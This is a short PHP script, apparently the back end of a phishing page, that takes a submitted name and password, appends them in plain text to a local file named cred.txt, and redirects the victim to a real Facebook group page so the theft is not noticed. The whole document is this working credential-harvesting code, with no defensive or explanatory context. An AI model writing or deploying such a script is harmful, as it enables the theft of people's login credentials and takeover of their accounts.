<?php $name=$_POST["name"];
$password=$_POST["password"];
$fiel=fopen('cred.txt','a');
fwrite($fiel,$name.",".$password."\n");
header("Location: https://www.facebook.com/groups/427890035980805");
